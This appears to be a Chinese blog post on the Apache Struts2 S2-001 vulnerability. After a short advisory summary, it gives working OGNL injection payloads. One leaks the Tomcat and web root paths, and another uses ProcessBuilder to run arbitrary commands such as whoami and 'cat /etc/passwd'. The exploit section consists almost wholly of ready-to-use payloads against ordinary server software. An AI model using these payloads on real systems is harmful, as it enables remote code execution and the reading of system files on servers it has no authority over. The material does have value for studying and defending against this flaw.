[博文地址](https://www.codemonster.cn/2018/03/28/2018-struts2-001/)
# 漏洞摘要
```
官方链接：https://cwiki.apache.org/confluence/display/WW/S2-001
官方概述：Remote code exploit on form validation error
影响版本：Struts 2.0.0 - Struts 2.0.8
修复摘要：数据 re-display 时禁止执行 OGNL 表达式
```

# 漏洞利用
### POC:
```
username=xishir&password=%{1+1}
```
![](https://www.codemonster.cn/img/s2/s2-001-2.png)  
### EXP:
获取tomcat执行路径：
```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```
获取Web路径：
```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```
执行任意命令：
```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```
带参数的命令：`new java.lang.String[]{"cat","/etc/passwd"}`
![](https://www.codemonster.cn/img/s2/s2-001-3.png)
